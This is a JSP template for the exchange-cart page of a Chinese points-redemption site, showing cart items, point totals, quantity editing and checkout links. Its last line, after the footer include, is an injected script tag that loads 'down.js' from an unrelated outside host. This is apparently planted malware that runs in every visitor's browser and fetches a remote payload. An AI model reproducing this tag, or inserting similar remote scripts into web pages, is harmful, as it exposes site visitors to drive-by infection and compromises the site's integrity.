<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<c:set var="title" value="积分联盟-兑换清单"/> 
<%@ include file="IncludeTop.jsp" %>

<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td width="178" height="129" valign="top">
		<%@ include file="accountBar.jsp" %>
		<%@ include file="searchAllBar.jsp" %>
		<%@ include file="newsBar.jsp" %>	</td>
    <td bgcolor="#FFFFFF" valign="top" width="602"> 
	<form name="exchangeForm" method="post" action='<c:url value="/modifyExchange.do"/>'>
	    <input type="hidden" name="productNo">
		<input type="hidden" name="quantity">		
        <table width="100%" border="0" cellpadding="1" cellspacing="0" bordercolor="#CCCCCC">
          <tr  bgcolor="#ACD1FF"> 
            <td height="28" colspan="5" align="center" > 
              <strong>您的兑换清单</strong> </td>
          </tr>
          <tr  bgcolor="#E1EFFF"> 
            <td width="35%" height="23" align="center"> 
            商品名称</td>
            <td width="15%" align="center"> 
            积点数</td>
            <td width="15%" align="center"> 
            数量</td>
            <td width="15%" align="center">&nbsp;</td>
            <td width="15%" align="center">&nbsp;</td>
          </tr>
          <c:set var="cart" value="${sessionScope.cart}"/>
		  <c:if test="${cart eq null or cart.items eq null or cart.itemSize eq 0}"> 
          <tr> 
            <td height="76" colspan="5" align="center"  class="red15"> 
              暂为空！</td>
          </tr>
          </c:if>
		  <c:if test="${cart ne null}">
		  <c:forEach var="item" items="${cart.items}" > 
          <tr> 
            <td width="35%" height="27" align="center"><c:out value="${item.product.name}"/></td>
            <td width="15%" align="center"><c:out value="${item.realPoint}"/></td>
            <td width="15%" align="center"> 
              <input type="text"  onblur="validate(this, '数量', 'number', 1, 4, false)"  name='quantity<c:out value="${item.product.productNo}"/>' maxlength="8" size="5" value='<c:out value="${item.quantity}"/>'>            </td>
            <td width="15%" align="center"><a href='javaScript:exchangeForm.productNo.value="<c:out value="${item.product.productNo}"/>";exchangeForm.quantity.value=exchangeForm.quantity<c:out value="${item.product.productNo}"/>.value;exchangeForm.submit()'>修改</a></td>
            <td width="15%" align="center"><a href='javaScript:exchangeForm.productNo.value="<c:out value="${item.product.productNo}"/>";exchangeForm.quantity.value=0;exchangeForm.submit()'>删除</a></td>
          </tr>
          </c:forEach> </c:if> 
          <tr   bgcolor="#E1EFFF"> 
            <td width="35%" height="36" align="center"><strong>合计</strong></td>
            <td width="15%" align="center"><c:out value="${cart.total}"/></td>
            <td width="15%" align="center"><c:out value="${cart.count}"/></td>
            <td width="15%" align="center">&nbsp;</td>
            <td width="15%" align="center">&nbsp;</td>
          </tr>
        </table>
	  </form>
 
	  <table width="100%" border="0" class="blue14">
        <tr> 
          <td width="40%" height="54" align="right"><a href='<c:url value="/queryProduct.do"/>'>继续兑换</a></td>
          <td width="10%"></td>
          <td width="50%"><a href='<c:url value="/createExchange.screen"/>'>兑换结算 </a></td>
        </tr>
  </table>    </tr>
</table>

<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>